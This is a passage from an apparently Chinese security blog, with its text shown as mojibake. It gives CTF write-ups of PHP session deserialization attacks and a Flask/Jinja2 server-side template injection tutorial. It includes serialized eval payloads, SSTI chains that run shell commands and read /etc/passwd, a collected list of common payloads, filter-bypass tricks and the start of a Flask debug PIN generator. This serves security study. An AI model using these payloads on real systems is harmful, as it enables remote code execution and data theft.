__construct(){ $this-&gt;varr = '1234567890'; $this-&gt;obj = null; } function __toString(){ $this-&gt;obj-&gt;execute(); return $this-&gt;varr; } function __desctuct(){ echo &quot;&lt;br&gt;è¿™æ˜¯foo2çš„ææ„å‡½æ•°&lt;br&gt;&quot;; }}class foo3{ public $varr; function execute(){ eval($this-&gt;varr); } function __desctuct(){ echo &quot;&lt;br&gt;è¿™æ˜¯foo3çš„ææ„å‡½æ•°&lt;br&gt;&quot;; }}?&gt; phpinfo.php 12345678&lt;?php session_start(); require(&quot;./class.php&quot;); $f3 = new foo3(); $f3-&gt;varr = &quot;phpinfo();&quot;; $f3-&gt;execute();?&gt; (2) é¢˜ç›®åˆ†æ è¯·æ±‚phpinfo.phpè·å–sessionçš„é…ç½®ä¿¡æ¯å¦‚ä¸‹ï¼š é»˜è®¤æ˜¯é‡‡ç”¨php_serializeå¤„ç†å™¨å¤„ç†sessionï¼Œsession.upload_progress.cleanupé…ç½®ä¸ºOffï¼Œsession.upload_progress.enabledé…ç½®ä¸ºOnï¼› session.upload_progress.enabledå½“å®ƒä¸ºå¼€å¯çŠ¶æ€æ—¶ï¼ŒPHPèƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸php.iniä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å°±å¯ä»¥åœ¨$_SESSIONä¸­è·å¾—ã€‚å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯session.upload_progress.prefixä¸ session.upload_progress.nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚ åˆ†æå‰é¢çš„ä»£ç å¹¶æ²¡æœ‰å‘ç°å¯ä»¥å‘æœåŠ¡å™¨å‘é€æ•°æ®çš„ç‚¹ï¼Œæ ¹æ®å‰é¢æ‰€è®²çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ æ–‡ä»¶çš„æ–¹å¼å‘ç›®æ ‡sessionå†™å…¥æ•°æ®ã€‚ å¹¶ä¸”æˆ‘ä»¬å‘ç°i.phpä¸phpinfo.phpä½¿ç”¨çš„sessionè§£æå™¨ä¸ç›¸åŒï¼› (3) æ¼æ´åˆ©ç”¨ åˆ†æclass.phpçš„æºç æ„é€ pocå¦‚ä¸‹: 123456789101112131415161718192021 &lt;?php class foo1{ public $varr; } class foo2{ public $varr; public $obj; } class foo3{ public $varr; } $obj = new foo1(); $obj-&gt;varr = new foo2(); $obj-&gt;varr-&gt;varr = $obj-&gt;varr; $obj-&gt;varr-&gt;varr-&gt;obj = new foo3(); $obj-&gt;varr-&gt;varr-&gt;obj-&gt;varr = &quot;include('php://filter/read=convert.base64-encode/resource=flag.php');&quot;; echo serialize($obj);?&gt; æœ¬åœ°æ„é€ ä¸Šè¡¨å•æ–‡ä»¶index.html 12345&lt;form action=&quot;http://192.168.1.191:32771/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; bpæˆªåŒ…ï¼Œä¿®æ”¹PHP_SESSION_UPLOAD_PROGRESSçš„å€¼ä¸ºclassåºåˆ—åŒ–çš„å€¼ |O:4:&quot;foo1&quot;:1:{s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:{s:4:&quot;varr&quot;;r:2;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:{s:4:&quot;varr&quot;;s:69:&quot;include('php://filter/read=convert.base64-encode/resource=flag.php');&quot;;}}} session_jarvis(1) é¢˜ç›®æºç  index.php 1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO{ public $mdzz; function __construct() { $this-&gt;mdzz = 'phpinfo();'; } function __destruct() { eval($this-&gt;mdzz); }}if(isset($_GET['phpinfo'])){ $m = new OowoO();}else{ highlight_string(file_get_contents('index.php'));}?&gt; phpinfo.php 1234&lt;?php session_start(); phpinfo();?&gt; (2) é¢˜ç›®åˆ†æ è¯·æ±‚é“¾æ¥å‘ç°é¦–é¡µæºç ï¼Œæ ¹æ®æºç ä¼ å…¥phpinfoä»»æ„å‚æ•°ï¼Œæ‰§è¡Œphpinfo()ï¼Œå¾—åˆ°é…ç½®ä¿¡æ¯å¦‚ä¸‹ï¼š æ ¹æ®ä»¥ä¸Šä¿¡æ¯å‘ç°æ˜¯å…¸å‹çš„åˆ©ç”¨äº†ä¸Šä¼ è¿™ä¸ªç‚¹ä¼ å…¥sessionæ•°æ®çš„ï¼› å¹¶ä¸”é€šè¿‡æ‰«æå‘ç°å­˜åœ¨phpinfo.phpè¿™ä¸ªé¡µé¢ï¼Œè¯·æ±‚å‘ç°è¿™ä¸ªé¡µé¢ä½¿ç”¨çš„æ˜¯é»˜è®¤çš„php_serializeè§£æå™¨ æ ¹æ®ä¸¤é¡µé¢ä½¿ç”¨çš„è§£æå™¨ä¸åŒç‰¹å¾ï¼Œå¯ä»¥è¾¾æˆä»»æ„çš„ååºåˆ—åŒ–åˆ©ç”¨ (3) æ¼æ´åˆ©ç”¨ æ„é€ ä¸Šä¼ è¡¨å• 12345&lt;form action=&quot;http://192.168.1.191:32768/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; æ„é€ ç›®å½•æ–‡ä»¶æ‰«æåºåˆ—åŒ–ä»£ç  1234567891011121314&lt;?phpclass OowoO{ public $mdzz; function __construct() { $this-&gt;mdzz = &quot;print_r(scandir(dirname(__FILE__)));&quot;; }}$obj = new OowoO();echo serialize($obj);//?&gt; O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;} æŠ“å–ä¸Šä¼ åŒ…ï¼Œä¿®æ”¹filenameå¸¦å…¥åºåˆ—åŒ–çš„å€¼ æ„é€ è¯»å–flagåºåˆ—åŒ–ä»£ç  1234567891011121314&lt;?phpclass OowoO{ public $mdzz; function __construct() { $this-&gt;mdzz = &quot;include(\\&quot;php://filter/read=convert.base64-encode/resource=MDZZ_you_see_The_FlAg.php\\&quot;);&quot;; }}$obj = new OowoO();echo serialize($obj);//?&gt; O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:86:&quot;include(&quot;php://filter/read=convert.base64-encode/resource=MDZZ_you_see_The_FlAg.php&quot;);&quot;;} è·å¾—flag","link":"/2019/05/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/php-code-audit/php-unserialzie-session/"},{"title":"pythonæ¨¡æ¿æ³¨å…¥æ¼æ´å§‹æœ«ï¼ˆSSTIï¼‰","text":"sstiåŸºç¡€sstiçš„å®šä¹‰SSTI(Server-Side Template Injection)ï¼Œå³æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»ï¼Œé€šè¿‡ä¸æœåŠ¡ç«¯æ¨¡æ¿çš„è¾“å…¥è¾“å‡ºäº¤äº’ï¼Œåœ¨è¿‡æ»¤ä¸ä¸¥æ ¼çš„æƒ…å†µä¸‹ï¼Œæ„é€ æ¶æ„è¾“å…¥æ•°æ®ï¼Œä»è€Œè¾¾åˆ°è¯»å–æ–‡ä»¶æˆ–è€…getshellçš„ç›®çš„ã€‚ æ¨¡æ¿å¼•æ“ æ¨¡æ¿å¼•æ“å¯ä»¥è®©ï¼ˆç½‘ç«™ï¼‰ç¨‹åºå®ç°ç•Œé¢ä¸æ•°æ®åˆ†ç¦»ï¼Œä¸šåŠ¡ä»£ç ä¸é€»è¾‘ä»£ç çš„åˆ†ç¦» æ¨¡æ¿æ˜¯ç”¨äºä»æ•°æ®ï¼ˆå˜é‡ï¼‰åˆ°å®é™…çš„è§†è§‰è¡¨ç°ï¼ˆHTMLä»£ç ï¼‰è¿™é¡¹å·¥ä½œçš„ä¸€ç§å®ç°æ‰‹æ®µ åç«¯æ¸²æŸ“ï¼šæµè§ˆå™¨ä¼šç›´æ¥æ¥æ”¶åˆ°ç»è¿‡æœåŠ¡å™¨è®¡ç®—ä¹‹åçš„å‘ˆç°ç»™ç”¨æˆ·çš„æœ€ç»ˆçš„HTMLå­—ç¬¦ä¸²ï¼Œè®¡ç®—å°±æ˜¯æœåŠ¡å™¨åç«¯ç»è¿‡è§£ææœåŠ¡å™¨ç«¯çš„æ¨¡æ¿æ¥å®Œæˆçš„ï¼Œåç«¯æ¸²æŸ“çš„å¥½å¤„æ˜¯å¯¹å‰ç«¯æµè§ˆå™¨çš„å‹åŠ›è¾ƒå°ï¼Œä¸»è¦ä»»åŠ¡åœ¨æœåŠ¡å™¨ç«¯å°±å·²ç»å®Œæˆ å‰ç«¯æ¸²æŸ“ï¼šå‰ç«¯æ¸²æŸ“ç›¸åï¼Œæ˜¯æµè§ˆå™¨ä»æœåŠ¡å™¨å¾—åˆ°ä¿¡æ¯ï¼Œå¯èƒ½æ˜¯jsonç­‰æ•°æ®åŒ…å°è£…çš„æ•°æ®ï¼Œä¹Ÿå¯èƒ½æ˜¯htmlä»£ç ï¼Œä»–éƒ½æ˜¯ç”±æµè§ˆå™¨å‰ç«¯æ¥è§£ææ¸²æŸ“æˆhtmlçš„äººä»¬å¯è§†åŒ–çš„ä»£ç è€Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰ï¼Œå¥½å¤„æ˜¯å¯¹äºæœåŠ¡å™¨åç«¯å‹åŠ›è¾ƒå°ï¼Œä¸»è¦æ¸²æŸ“åœ¨ç”¨æˆ·çš„å®¢æˆ·ç«¯å®Œæˆ jinja2Jinja2æ˜¯Flaskä½œè€…å¼€å‘çš„ä¸€ä¸ªæ¨¡æ¿ç³»ç»Ÿï¼Œèµ·åˆæ˜¯ä»¿djangoæ¨¡æ¿çš„ä¸€ä¸ªæ¨¡æ¿å¼•æ“ï¼Œä¸ºFlaskæä¾›æ¨¡æ¿æ”¯æŒï¼Œç”±äºå…¶çµæ´»ï¼Œå¿«é€Ÿå’Œå®‰å…¨ç­‰ä¼˜ç‚¹è¢«å¹¿æ³›ä½¿ç”¨ã€‚ åœ¨Jinja2ä¸­ï¼Œå­˜åœ¨ä¸‰ç§è¯­å¥ï¼š 123æ§åˆ¶ç»“æ„ {% %}å˜é‡å–å€¼ {{ }}æ³¨é‡Š {# #} render_template()å…·ä½“æ¸²æŸ“æµç¨‹å¦‚ä¸‹ï¼š render_template()å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ¸²æŸ“çš„ç›®æ ‡htmlé¡µé¢ã€ç¬¬äºŒä¸ªå‚æ•°ä¸ºéœ€è¦åŠ è½½åˆ°é¡µé¢æŒ‡å®šæ ‡ç­¾ä½ç½®çš„å†…å®¹ æ³¨ï¼šå½“åœ¨HTMLæ¨¡æ¿ä¸­åœ¨æ ‡ç­¾å†…ä¼ å…¥çš„å†…å®¹æ˜¯é€šè¿‡å¦‚name=valueè€Œé%sè¿™ç§ä¼ å‚å½¢å¼æ—¶ï¼ŒHTMLè‡ªåŠ¨è½¬ä¹‰é»˜è®¤å¼€å¯ã€‚ æµ‹è¯•demo app.py æºç  1234567891011121314151617from flask import Flaskfrom flask import request, render_template_string, render_templateapp = Flask(__name__)@app.route('/login')def hello_ssti(): person = { 'name': 'hello', 'secret': 'This_is_my_secret' } if request.args.get('name'): person['name'] = request.args.get('name') return render_template(&quot;index.html&quot;, person=person)if __name__ == &quot;__main__&quot;: app.run(debug=True) ç„¶ååœ¨templatesç›®å½•æ–°å»ºindex.html 1&lt;h2&gt;Hello {{ person.name }}!&lt;/h2&gt; è¯·æ±‚ä¼ å…¥å‚æ•°nameï¼Œé¡µé¢ç›´æ¥å›æ˜¾ç»“æœ ä¼ å…¥xssä»£ç ï¼Œç›´æ¥è¢«è½¬ä¹‰ render_template_string()è¿™ä¸ªå‡½æ•°ä½œç”¨å’Œå‰é¢çš„ç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºåªæ˜¯ç¬¬ä¸€ä¸ªå‚æ•°å¹¶éæ˜¯æ–‡ä»¶åè€Œæ˜¯å­—ç¬¦ä¸²ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¸éœ€è¦å†åœ¨templatesç›®å½•ä¸­æ–°å»ºHTMLæ–‡ä»¶äº†ï¼Œè€Œæ˜¯å¯ä»¥ç›´æ¥å°†HTMLä»£ç å†™åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œç„¶åä½¿ç”¨è¯¥å‡½æ•°æ¸²æŸ“è¯¥å­—ç¬¦ä¸²ä¸­çš„HTMLä»£ç åˆ°é¡µé¢å³å¯ã€‚ æµ‹è¯•demo 123456789101112131415161718from flask import Flaskfrom flask import request, render_template_string, render_templateapp = Flask(__name__)@app.route('/login')def hello_ssti(): person = { 'name': 'hello', 'secret': 'This_is_my_secret' } if request.args.get('name'): person['name'] = request.args.get('name') template = '&lt;h2&gt;Hello {{ person.name }}!&lt;/h2&gt;' return render_template_string(template, person=person)if __name__ == &quot;__main__&quot;: app.run(debug=True) sstiæ¼æ´æˆå› ç»„ä»¶ç‰ˆæœ¬ Flask 0.12.1 Werkzeug 0.14.1 æ¼æ´ä»£ç 123456789101112131415161718192021from flask import Flaskfrom flask import render_templatefrom flask import requestfrom flask import render_template_stringapp = Flask(__name__)@app.route('/test',methods=['GET', 'POST'])def test(): template = ''' &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; ''' %(request.url) print(request.url) return render_template_string(template)if __name__ == '__main__': app.debug = True app.run() åˆ†æåˆ©ç”¨æˆ‘ä»¬å¯ä»¥å‘ç°æ­¤æ—¶çš„ä»£ç ä¼ å‚å·²ç»æ›´æ¢æˆ%sçš„æ–¹å¼ä¼ å…¥ï¼Œå¹¶ä¸”è°ƒç”¨äº†render_template_stringå‡½æ•° ä¼ å…¥å‚æ•°/test?{{10+10}} æˆ‘ä»¬å‘ç°è¿”å›å€¼å˜æˆæ±‚å’Œçš„ç»“æœå€¼ï¼Œä¼ å…¥çš„æ¶æ„ä»£ç è¢«è§£ææ‰§è¡Œäº† æ¼æ´åˆ©ç”¨æ­¥éª¤pythonä¸­çš„é­”æ³•å‡½æ•°1234567__class__ è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡ï¼ˆç±»ï¼‰__mro__ è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚__base__ è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»// __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„__subclasses__ æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„å¼•ç”¨çš„åˆ—è¡¨__init__ ç±»çš„åˆå§‹åŒ–æ–¹æ³•__globals__ å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ payloadçš„æ„é€ æ€è·¯å¤§è‡´æ€è·¯:æ‰¾åˆ°çˆ¶ç±»&lt;type 'object'&gt;â€“&gt;å¯»æ‰¾å­ç±»(å¯èƒ½å­˜åœ¨å¯¹æ–‡ä»¶æ“ä½œçš„ç±»file)â€“&gt;æ‰¾å…³äºå‘½ä»¤æ‰§è¡Œæˆ–è€…æ–‡ä»¶æ“ä½œçš„æ¨¡å— {{''.__class__}} è·å–å­—ç¬¦ä¸²çš„ç±»å¯¹è±¡ {{''.__class__.__mro__}} è·å–å¯¹åº”ç±»çš„åŸºç±» {{''.__class__.__mro__[1].__subclasses__()}} è·å–å¯¹åº”ç±»çš„åŸºç±» æ­¤æ—¶æˆ‘ä»¬éœ€è¦ä½¿ç”¨è„šæœ¬å¯»æ‰¾å¯ä»¥è¢«åˆ©ç”¨çš„å­ç±»ï¼Œè¿™è¾¹å¯»æ‰¾os._wrap_close 1234567891011121314151617#!/usr/local/env python3import requestsurl = &quot;http://127.0.0.1:5000/test?&quot;payload = &quot;{{{{ ''.__class__.__mro__[1].__subclasses__()[{number}] }}}}&quot;for i in range(300): temp = url + payload.format(number = i) #print(temp) res = requests.get(url = temp, timeout = 5) print(&quot;[-] INFO : å¼€å§‹æŸ¥æ‰¾ %d&quot; %i) #print(res.text) # warnings.catch_warnings wrap_close file if 'os._wrap_close' in res.text: print(&quot;[+] INFO :æ‰¾åˆ°pyaload: %s&quot; %temp) æˆåŠŸæœç´¢åˆ°å¯¹åº”å‘½ä»¤æ‰§è¡Œç±»çš„ç¼–å·ä¸º128 {{''.__class__.__mro__[1].__subclasses__()[128]}} æˆåŠŸè·å–åˆ°å¯¹åº”çš„ç±» {{''.__class__.__mro__[1].__subclasses__()[128].__init__}} åˆå§‹åŒ–ç±»æ–¹æ³• {{''.__class__.__mro__[1].__subclasses__()[128].__init__}} åˆå§‹åŒ–ç±»æ–¹æ³• {{''.__class__.__mro__[1].__subclasses__()[128].__init__.__globals__['__builtins__']['eval']}} è°ƒç”¨evalå±é™©å‡½æ•° {{''.__class__.__mro__[1].__subclasses__()[128].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('whoami').read()\")}}æ‰§è¡Œå‘½ä»¤ å¸¸ç”¨payloadæ±‡æ€»12345678910111213141516171819202122232425262728293031323334è·å¾—åŸºç±»python2.7''.__class__.__mro__[2]{}.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[1]python3.7''.__class__.__mro__[1]{}.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[1]python 2.7æ–‡ä»¶æ“ä½œ[].__class__.__bases__[0].__subclasses__()[40][].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()[].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')å‘½ä»¤æ‰§è¡Œ[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__ [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('id').read()&quot;)[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__('os').popen('id').read()&quot;)[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()python3.7å‘½ä»¤æ‰§è¡Œ{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('id').read()&quot;) }}{% endif %}{% endfor %}æ–‡ä»¶æ“ä½œ{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}windowsä¸‹çš„oså‘½ä»¤&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read() å…¶ä»–æ¼æ´åˆ©ç”¨XSSæ’å…¥ä»€ä¹ˆè¿”å›ä»€ä¹ˆï¼Œè¯´æ˜å¿…å®šå¯ä»¥xss,&lt;script&gt;alert('xss')&lt;/script&gt; æ•æ„Ÿä¿¡æ¯çš„æ³„éœ²{{config}} è®¿é—®å¯¹åº”çš„å…¨å±€å˜é‡å³å¯ç›´æ¥æ³„éœ²å‡ºé…ç½®æ–‡ä»¶çš„å†…å®¹ã€‚ çœŸé¢˜å¤ç°flask_deliciousè¿™æ˜¯ä¸€å¥—ctfçœŸé¢˜å¤ç° é¦–å…ˆè¯·æ±‚ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç‚«é…·demoç•Œé¢ï¼Œä¸€èˆ¬è¿™ç§ç•Œé¢æ²¡å•¥å¥½å®¡è®¡çš„ é‚£ä¹ˆç›´æ¥F12è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå‘ç°å­˜åœ¨python3.5.2çš„ç¯å¢ƒï¼Œå¹¶ä¸”æ²¡æœ‰é™æ€æœåŠ¡å™¨ çŒœæµ‹æ˜¯ä¸€ä¸ªpythonçš„ç«™ï¼Œç‚¹å‡»å…¶ä»–çš„demoæµ‹è¯•é¡µ å‘ç°è¿™æ˜¯ä¸€ä¸ªflaskçš„404é¡µé¢ï¼Œé‚£ä¹ˆç›´æ¥è”æƒ³åˆ°çš„æ˜¯sstiæ³¨å…¥ {{4+4}} å‘ç°ç¡®å®å­˜åœ¨ssti è¿™ç§ä¸€èˆ¬å¯èƒ½ä¼šå­˜åœ¨è¿‡æ»¤ï¼Œå¯ä»¥ç®€å•fuzzä¸€ä¸‹{{payload}} å¤§æ¦‚è¿‡æ»¤äº†å¦‚ä¸‹çš„ä¸€äº›å†…å®¹configã€classã€mroã€argsã€requestã€openã€evalã€builtinsã€importç­‰ åŸºæœ¬æŠŠæˆ‘ä»¬å¸¸ç”¨çš„sstiå…³é”®å­—éƒ½ç»™è¿‡æ»¤äº† ç»è¿‡æŸ¥é˜…flaskå®˜æ–¹æ–‡æ¡£ï¼Œæ‰¾åˆ°è¿˜æœ‰sessionå¯¹è±¡å¯ä»¥ä½¿ç”¨ï¼Œå¹¶ä¸”æœªè¢«è¿‡æ»¤ï¼›å¹¶ä¸”sessionæ˜¯ä¸€ä¸ªå­—å…¸å¯¹è±¡ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡é”®çš„æ–¹æ³•è®¿é—®ç›¸åº”çš„ç±»ï¼Œä¸”é”®æ˜¯å­—ç¬¦ä¸²æ ¼å¼ï¼Œå­—ç¬¦ä¸²æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ‹¼æ¥ç»•è¿‡ payload:{{session['__cla'+'ss__']}} è®¿é—®åˆ°äº†è¯¥ç±»ä¹‹åï¼Œå¯ä»¥é€šè¿‡__base__æ¥è·å–åŸºç±»çš„å…ƒç»„ï¼Œä¸€ç›´å‘ä¸Šå»è·å–åˆ°objectçš„åŸºç±» payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__}} é€šè¿‡__subclasses_è·å–åŸºç±»ä¸­æ‰€æœ‰çš„å­ç±» payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()}} ä½¿ç”¨è„šæœ¬æ‰¾åˆ°å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„å­ç±» 1234567891011121314151617#!/usr/local/env python3import requestsurl = &quot;http://192.168.1.191:19008/&quot;payload = &quot;{{{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[{number}]}}}}&quot;for i in range(300): temp = url + payload.format(number = i) #print(temp) res = requests.get(url = temp, timeout = 5) print(&quot;[-] INFO : å¼€å§‹æŸ¥æ‰¾ %d&quot; %i) #print(res.text) # warnings.catch_warnings wrap_close file if 'os._wrap_close' in res.text: print(&quot;[+] INFO : æ‰¾åˆ° pyaload: %s&quot; %temp) payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[293]}} è·å–å½“å‰å­ç±»çš„æ‰€æœ‰å†…å»ºæ–¹æ³• payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[293].__init__.__globals__}} è°ƒç”¨popenå‘½ä»¤æ‰§è¡Œè·å–flag paylaod:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[293].__init__.__globals__['pop'+'en']('cat /Th1s__is_S3cret'').read()}} flask_plusè¿™é“é¢˜å…¶å®æ˜¯ä¸Šä¸€é¢˜çš„å§Šå¦¹é¢˜ï¼Œå†…å®¹éƒ½æ˜¯å·®ä¸å¤šäº†ï¼Œåªä¸è¿‡åœ¨è¿‡æ»¤ä¸Šåˆå¤šåšäº†ä¸€äº›æ‰‹è„š ç›´æ¥æ‹¿åŸæ¥çš„payloadçš„å°è¯•,å‘ç°ä¸€ç›´åˆ°è·å–å­ç±»os.__warp_closeéƒ½æ˜¯okçš„ payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[72]}} ä½†æ˜¯æ­¤æ—¶å‡ºç°é—®é¢˜äº†,åˆ°æˆ‘ä»¬å†æ¬¡ä½¿ç”¨__init__å®ä¾‹åŒ–æ–¹æ³•æ—¶ï¼Œå‘ç°è¢«è¿‡æ»¤äº† payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[72].__init__}} åˆ°è¿™é‡Œå²‚ä¸æ˜¯æˆ‘ä»¬çš„è·¯å°±è¢«åˆ‡æ­»äº†ä¹ˆï¼Ÿä¸ä¼šï¼Œç»§ç»­æŸ¥é˜…èµ„æ–™,è¿›è¡Œæœ¬åœ°æµ‹è¯• æˆ‘ä»¬å‘ç°è¯¥å­ç±»ä¸­è¿˜å­˜åœ¨__enter__å±æ€§ï¼Œç»æµ‹è¯•å‘ç°è¯¥å±æ€§å­˜åœ¨å¯ä»¥è°ƒç”¨__globals__ payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[72].__enter__.__globals__}} å¯ä»¥æˆåŠŸè®¿é—®æ–¹æ³•ï¼Œé‚£ä¹ˆç›´æ¥æ„é€ æœ€ç»ˆæ‹¿flagçš„payload payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[72].__enter__.__globals__['pop'+'en']('cat /Th1s_is__F1114g').read()}} Flask PINç PINç æœºåˆ¶Flaskåº”ç”¨åœ¨debugæ¨¡å¼ä¸‹æä¾›äº†ä¸€ç§é¡µé¢ç«¯çš„äº¤äº’è°ƒè¯•å·¥å…·ï¼Œå’Œå¹³æ—¶ä½¿ç”¨pythonäº¤äº’å¼å‘½ä»¤ç»ˆç«¯æ˜¯ä¸€æ ·çš„ã€‚åœ¨æ—§ç‰ˆæœ¬çš„flaskä¸­æ˜¯ä¸éœ€è¦è¾“å…¥PINç ç›´æ¥æ‰§è¡Œä»£ç çš„ã€‚åœ¨æ–°ç‰ˆæœ¬çš„flaskä¸­éœ€è¦è¾“å…¥PINè¿›è¡Œè®¤è¯ï¼Œæ‰èƒ½æ‰§è¡Œè‡ªå®šä¹‰çš„ä»£ç ï¼Œç›¸å½“äºåœ¨è¿›å…¥ç»ˆç«¯å‰è®¾ç½®äº†ä¸€ä¸ªå¯†ç çš„é™åˆ¶ã€‚ä½†æ˜¯PINæœ‰è¿™æ ·çš„ä¸€ä¸ªæœºåˆ¶ï¼Œåœ¨åŒä¸€å°æœºå™¨ä¸Šï¼Œå¤šæ¬¡é‡å¯flaskæœåŠ¡ï¼ŒPINç çš„å€¼æ˜¯ä¸€ä¸ªå›ºå®šå€¼ï¼Œè¿™å°±è®©ä»£ç çš„åˆ©ç”¨å†æ¬¡æˆä¸ºäº†ä¸€ç§å¯èƒ½ã€‚ PINç çš„ç”Ÿæˆæœºåˆ¶PINçš„çš„ç”Ÿæˆéœ€è¦ç‰¹å®šçš„å…­ä¸ªå…ƒç´ å³å¯ï¼š æœåŠ¡å™¨è¿è¡ŒFlaskæ‰€ç™»é™†çš„ç”¨æˆ·åusernameï¼ˆrootæˆ–å…¶ä»–ï¼‰ modname,ä¸€èˆ¬ä¸ºflask.app Flask # getattr(app, '__name__', getattr(app.__class__, '__name__')) flaskåº“ä¸‹çš„app.pyç»å¯¹è·¯å¾„ï¼Œå¯ç”±debugé¡µé¢è·å¾— å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°. macåœ°å€åœ¨linuxç³»ç»Ÿé‡Œçš„ /sys/class/net/eth0/address æœºå™¨çš„IDï¼Œ linuxçš„idä¸€èˆ¬å­˜æ”¾åœ¨/etc/machine-idæˆ–/proc/sys/kernel/random/boot_iï¼Œæœ‰çš„ç³»ç»Ÿæ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶ ï¼Œå¦‚æœæ˜¯dockeræœºå™¨ï¼Œåˆ™åœ¨ /proc/self/cgroup PINç ç”Ÿæˆè„šæœ¬1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb', #username 'flask.app', #modname 'Flask', #getattr(app, '__name__', getattr(app.__class__, '__name__')) 